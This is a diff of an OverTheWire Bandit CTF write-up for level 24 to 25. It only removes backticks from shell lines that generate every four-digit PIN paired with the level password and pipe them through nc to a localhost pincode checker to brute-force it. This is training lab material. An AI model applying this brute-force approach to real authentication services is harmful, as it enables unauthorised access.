@@ -284,8 +284,8 @@ Okay looks like if we enter the wrong pin then it ruturns an error and it allows
 Let's create a temp directory and our dictionary:
 
 ```console
-bandit24@bandit:/tmp/bd2425$ `for i in $(seq 0000 9999); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> pincodes.txt; done  `
-bandit24@bandit:/tmp/bd2425$ `head pincodes.txt`
+bandit24@bandit:/tmp/bd2425$ for i in $(seq 0000 9999); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i >> pincodes.txt; done
+bandit24@bandit:/tmp/bd2425$ head pincodes.txt
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 2
@@ -296,7 +296,7 @@ UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 6
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 7
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 8
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9
-bandit24@bandit:/tmp/bd2425$ `tail pincodes.txt`
+bandit24@bandit:/tmp/bd2425$ tail pincodes.txt
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9990
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9991
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9992
@@ -312,7 +312,7 @@ UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 9999
 Looks good now let's feed it to `nc` and invert-match using `grep`.
 
 ```console
-bandit24@bandit:/tmp/bd2425$ `nc -nv 127.0.0.1 30002 < pincodes.txt | grep -v Wrong`
+bandit24@bandit:/tmp/bd2425$ nc -nv 127.0.0.1 30002 < pincodes.txt | grep -v Wrong
 Connection to 127.0.0.1 30002 port [tcp/*] succeeded!
 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
 Correct!
